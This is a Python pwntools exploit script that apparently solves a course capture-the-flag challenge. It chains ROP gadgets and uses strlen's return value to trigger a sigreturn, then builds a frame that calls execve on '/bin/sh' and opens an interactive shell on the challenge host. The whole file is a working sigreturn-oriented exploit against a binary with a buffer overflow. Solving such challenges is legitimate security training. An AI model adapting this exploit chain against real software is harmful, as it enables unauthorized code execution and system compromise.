from pwn import *

binary = "./chal.bin"

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
b vuln
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    if args.REMOTE:
        return remote("cse4850-srop-1.chals.io", 443, ssl=True, sni="cse4850-srop-1.chals.io")
    return process(e.path)

# Getting information about all of the gadgets
syscalli = r.find_gadget(['syscall'])[0]
bin_sh = next(e.search(b'/bin/sh\0'))
pop_rdi_ret = r.find_gadget(['pop rdi', 'ret'])[0]
strlen = e.sym['strlen']
string = next(e.search(b'-'*14 + b'\n\0'))

# Constructing the sigreturn frame
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscalli

# Constructing chain to be sent to the binary
chain = cyclic(16)
chain += p64(pop_rdi_ret)
chain += p64(string)
chain += p64(strlen)
chain += p64(syscalli)
chain += bytes(frame)

# Run the exploit
p = start()
p.sendline(chain)
p.interactive()